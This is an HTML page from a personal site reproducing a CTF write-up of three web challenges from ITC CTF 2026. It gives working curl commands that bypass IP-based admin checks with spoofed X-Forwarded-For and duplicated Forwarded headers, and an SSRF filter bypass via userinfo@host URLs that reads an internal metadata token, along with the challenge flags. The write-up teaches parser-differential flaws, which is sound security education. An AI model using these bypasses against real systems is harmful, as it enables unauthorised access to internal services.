@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ITC Trilogy — Three Parsers Walk Into /admin — cuddest</title>
+<meta name="description" content="Three web challenges I authored for ITC CTF 2026 Blida — parser differential attacks on proxy headers and SSRF.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <a class="logo" href="../index.html#writing" aria-label="cuddest — back to writeups">
+      <svg class="logo-mark" viewBox="0 0 24 24" aria-hidden="true">
+        <rect x="1.6" y="1.6" width="20.8" height="20.8" rx="2"
+              fill="none" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M15.6 8.9a4.2 4.2 0 1 0 0 6.2" fill="none"
+              stroke="var(--logo-accent)" stroke-width="1.9" stroke-linecap="round"/>
+      </svg>
+      <span class="logo-word">uddest</span>
+    </a>
+    <span class="topbar-cta"><a class="ulink" href="../index.html#writing">← All writeups</a></span>
+  </div>
+</header>
+
+<article class="wpost">
+  <header class="wpost-head">
+    <p class="wpost-meta"><span>ITC CTF 2026 Blida</span><span>15 min read</span></p>
+    <h1>Three Parsers Walk Into /admin</h1>
+    <p style="margin-top:12px; font-family:var(--mono); font-size:12px; letter-spacing:.06em; color:var(--ink-3);">
+      Challenge author: <strong style="color:var(--accent);">Ayoub Touati</strong> &mdash;
+      Writeup by <a href="https://github.com/samir-djili" style="color:var(--ink-2); border-bottom:1px solid var(--rule);">Samir Djili</a> &mdash;
+      2nd place, ITC CTF 2026 writeup contest
+    </p>
+  </header>
+  <div class="wpost-body">
+
+<div class="answer" style="border-left-color:var(--accent); background:rgba(201,165,108,.08);">
+  <strong>Author's note:</strong> I designed and built this trilogy of web challenges for ITC CTF 2026 in Blida, Algeria. Each challenge explores a different parser differential — the same class of bug repeated in three different contexts. This writeup by Samir Djili earned 2nd place in the CTF's writeup contest. I'm showcasing it here because it's an excellent breakdown of the intended solutions.
+</div>
+
+<p>This is a trilogy of web challenges I authored for <strong>ITC CTF 2026</strong>, held in Blida, Algeria. The three challenges — <em>The Jump</em>, <em>Filtered</em>, and <em>Anabasis</em> — each explore parser differential bugs in proxy header handling and URL validation. The common thread: the security layer and the application disagree on the value they are handling.</p>
+
+<p>The writeup below was written by <a href="https://github.com/samir-djili">Samir Djili</a>, who solved all three challenges and earned 2nd place in the writeup contest.</p>
+
+<hr>
+
+<h2>1. The Jump</h2>
+
+<p>Target: <code>https://the-jump.onrender.com/</code></p>
+
+<p>The homepage tells us the challenge is location-sensitive. The <code>/admin</code> console returns 403:</p>
+
+<pre><code>HTTP/1.1 403 Forbidden
+
+The Operations Console is available to staff on the corporate network only.</code></pre>
+
+<p>The app does not care who I am, it cares where it thinks I am coming from. The first primitive to test is <code>X-Forwarded-For</code>.</p>
+
+<p>The obvious private IPs failed — <code>10.0.0.1</code> and <code>127.0.0.1</code> both got caught by a filter. But blocking strings is not the same as blocking addresses.</p>
+
+<h3>IPv4 over IPv6</h3>
+
+<p>IPv6 has an IPv4-mapped representation: <code>::ffff:x.x.x.x</code>. For <code>10.0.0.1</code>:</p>
+
+<pre><code>0a 00 00 01  →  0a00:0001  →  a00:1
+
+So: ::ffff:a00:1</code></pre>
+
+<p>The filter sees text that does not look like <code>10.0.0.1</code>. The application IP parser sees an IPv4-mapped address that lands in the internal range.</p>
+
+<pre><code>curl -sS \
+  -H 'X-Forwarded-For: ::ffff:a00:1' \
+  'https://the-jump.onrender.com/admin' | grep -o 'itc{[^}]*}'
+
+itc{3asy_st4art_duhewfi}</code></pre>
+
+<h2>2. Filtered</h2>
+
+<p>Target: <code>https://filtered-3rwy.onrender.com/</code></p>
+
+<p>The second challenge patched the <code>X-Forwarded-For</code> trick. The <code>Forwarded</code> header (RFC 7239) is the next suspect.</p>
+
+<p>A direct <code>Forwarded: for=::ffff:a00:1</code> was blocked. The fix: use <strong>two physical <code>Forwarded</code> headers</strong>.</p>
+
+<pre><code>Forwarded: proto=http;by=203.0.113.43
+Forwarded: for=::ffff:a00:1</code></pre>
+
+<p>The filter checks the first header (no <code>for=</code>, passes). The app extracts the <code>for=</code> from the second one. Order-sensitive parser differential.</p>
+
+<pre><code>curl -sS \
+  -H 'Forwarded: proto=http;by=203.0.113.43' \
+  -H 'Forwarded: for=::ffff:a00:1' \
+  'https://filtered-3rwy.onrender.com/admin' | grep -o 'itc{[^}]*}'
+
+itc{4_h4ard3r_f1lt3r_f0r_th1s_d4nc3}</code></pre>
+
+<h2>3. Anabasis</h2>
+
+<p>Target: <code>https://throughfall-anabasis.onrender.com/</code></p>
+
+<p>A URL preview service with SSRF potential. The <code>/status</code> endpoint reveals an internal metadata service at <code>127.0.0.1:8081</code>.</p>
+
+<p>Direct access is blocked. The trick: the <code>userinfo@host</code> URL syntax.</p>
+
+<pre><code>http://any@127.0.0.1:8081/metadata</code></pre>
+
+<p>A naive validator splits at <code>://</code> and <code>:</code>, approves <code>any</code> as the host. The real HTTP client parses the URL grammar correctly and fetches from <code>127.0.0.1</code>.</p>
+
+<h3>Step 1: read metadata</h3>
+
+<pre><code>curl -sS \
+  'https://throughfall-anabasis.onrender.com/preview?url=http://any@127.0.0.1:8081/metadata'
+
+{
+  "body":"{\"note\":\"present this token to /admin/flag as ?token=\",\"token\":\"b48f5a9ce22698e88f5d132e82afa4e3\"}",
+  "status":200
+}</code></pre>
+
+<h3>Step 2: use the token</h3>
+
+<pre><code>curl -sS \
+  'https://throughfall-anabasis.onrender.com/preview?url=http://any@127.0.0.1:8081/admin/flag?token=b48f5a9ce22698e88f5d132e82afa4e3'
+
+{
+  "body": "{\"flag\":\"itc{4_c0v3r_f0r_4_h1gh3r_f0rm}\"}",
+  "status": 200
+}</code></pre>
+
+<h2>Takeaway</h2>
+
+<p>The three solves all come down to the same mistake: the security layer and the application did not agree on the value they were handling.</p>
+
+<ul>
+<li>Challenge 1: the filter blocked obvious private IPv4 strings, while the app accepted an IPv4-mapped IPv6 address</li>
+<li>Challenge 2: the policy check and the app disagreed on repeated <code>Forwarded</code> headers</li>
+<li>Challenge 3: the URL validator and the HTTP client disagreed on where the host actually was</li>
+</ul>
+
+<p>That progression is what made the set work. Each challenge was compact, but the solve was never just "reuse the last trick". It kept forcing the same question in a slightly different place: what exactly got parsed, and who used the parsed result?</p>
+
+<hr>
+
+<div class="answer" style="border-left-color:var(--sage); background:rgba(159,176,137,.06);">
+  <strong>Flags:</strong><br>
+  <code>itc{3asy_st4art_duhewfi}</code><br>
+  <code>itc{4_h4ard3r_f1lt3r_f0r_th1s_d4nc3}</code><br>
+  <code>itc{4_c0v3r_f0r_4_h1gh3r_f0rm}</code>
+</div>
+
+<p style="margin-top:30px; font-family:var(--mono); font-size:12px; color:var(--ink-3);">
+  Original writeup: <a href="https://samir-djili.github.io/ITC-trilogy/" style="color:var(--accent); border-bottom:1px solid var(--rule);">samir-djili.github.io/ITC-trilogy</a> &mdash; by <a href="https://github.com/samir-djili" style="color:var(--ink-2); border-bottom:1px solid var(--rule);">Samir Djili</a>
+</p>
+
+  </div>
+  <footer class="wpost-foot">
+    <a class="btn-line" href="../index.html#writing">← Back to all writeups</a>
+  </footer>
+</article>
+
+<footer class="colophon">
+  <div class="wrap colophon-in">
+    <span>Set in Geist &amp; JetBrains Mono</span>
+    <span><a class="ulink" href="../index.html#writing">Back to the site</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
